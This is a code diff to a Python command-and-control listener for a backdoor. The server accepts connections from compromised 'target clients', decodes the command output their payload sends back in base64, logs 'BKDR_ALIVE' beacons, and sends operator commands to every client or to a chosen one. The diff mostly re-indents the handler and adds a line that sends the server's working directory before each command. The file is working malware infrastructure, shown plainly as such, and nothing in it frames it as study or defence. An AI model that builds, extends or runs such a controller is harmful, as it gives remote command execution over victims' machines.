@@ -4,6 +4,7 @@ It then listens for incoming connections on the specified port and handles them 
 
 """
 
+import os
 import socket
 import threading
 import base64
@@ -23,50 +24,50 @@ clients = {}
 # Postcondition: The function will receive data from the client, anad handle it accordingly. 
 
 def handle_client(client_socket, client_address):
-    print(f'[*] Connection made with: {client_address}')
-    clients[client_address] = client_socket   # Store client for sending commands
+  print(f'[*] Connection made with: {client_address}')
+  clients[client_address] = client_socket   # Store client for sending commands
 
-    try:
-        while True:
-            data = client_socket.recv(4096)
-            if not data:
-                break
+  try:
+    while True:
+      data = client_socket.recv(4096)
+      if not data:
+        break
 
-            request = data.decode('utf-8', errors='ignore').strip()
+      request = data.decode('utf-8', errors='ignore').strip()
 
-            # Handle command results from payload
-            if request.startswith("CMD_RES|"):
-                try:
-                    encoded = request[8:]  # Remove "CMD_RES|"
-                    decoded_bytes = base64.b64decode(encoded)
-                    real_output = decoded_bytes.decode('utf-8')
-                    print(f"\n[+] Command Output from {client_address}:")
-                    print(real_output)
-                    print("-" * 60)   # separator line
-                except Exception as decode_error:
-                    print(f"[!] Failed to decode output: {decode_error}")
-                    print(f"Raw: {request}")
+      # Handle command results from payload
+      if request.startswith("CMD_RES|"):
+        try:
+          encoded = request[8:]  # Remove "CMD_RES|"
+          decoded_bytes = base64.b64decode(encoded)
+          real_output = decoded_bytes.decode('utf-8')
+          print(f"\n[+] Command Output from {client_address}:")
+          print(real_output)
+          print("-" * 60)   # separator line
+        except Exception as decode_error:
+          print(f"[!] Failed to decode output: {decode_error}")
+          print(f"Raw: {request}")
 
-            # Handle error messages from payload
-            elif request.startswith("CMD_ERR|"):
-                error_msg = request[8:]
-                print(f"[!] Command Error from {client_address}: {error_msg}")
+      # Handle error messages from payload
+      elif request.startswith("CMD_ERR|"):
+        error_msg = request[8:]
+        print(f"[!] Command Error from {client_address}: {error_msg}")
 
-            # Handle beacon
-            elif request.startswith("BKDR_ALIVE|"):
-                print(f"[+] Beacon received from {client_address}: {request}")
+      # Handle beacon
+      elif request.startswith("BKDR_ALIVE|"):
+        print(f"[+] Beacon received from {client_address}: {request}")
 
-            # Everything else (including the old cwd message)
-            else:
-                print(f'[*] Received from {client_address}: {request}')
+      # Everything else (including the old cwd message)
+      else:
+        print(f'[*] Received from {client_address}: {request}')
 
-    except Exception as e:
-        print(f'[!] Error with {client_address}: {e}')
-    finally:
-        client_socket.close()
-        if client_address in clients:
-            del clients[client_address]
-        print(f'[*] Client {client_address} disconnected. Remaining: {len(clients)}')
+  except Exception as e:
+    print(f'[!] Error with {client_address}: {e}')
+  finally:
+    client_socket.close()
+    if client_address in clients:
+      del clients[client_address]
+    print(f'[*] Client {client_address} disconnected. Remaining: {len(clients)}')
 
 # Create a TCP server (listener) and bind it to the specified IP and port
 # Identify all connected target cients in the dictionary for accessability
@@ -97,13 +98,6 @@ def start_listener():
       print(f'[*] Number of connected clients: {len(clients)}') # Print number of connected clients
 
 
-
-
-
-
-
-
-
 # Run starat_listener
 if __name__ == "__main__":
   print("[*] Starting listener...") # Print a message indicating that the listener is starting
@@ -122,6 +116,7 @@ if __name__ == "__main__":
         command = cmd[5:] # Extract command from input
 
         for client in clients.values(): 
+          client.send(os.getcwd().encode("utf-8"))
           client.send(command.encode("utf-8")) # Send command to each client
       else:
         address, command = cmd[1:].split(" ", 1) # Extract address and command from input
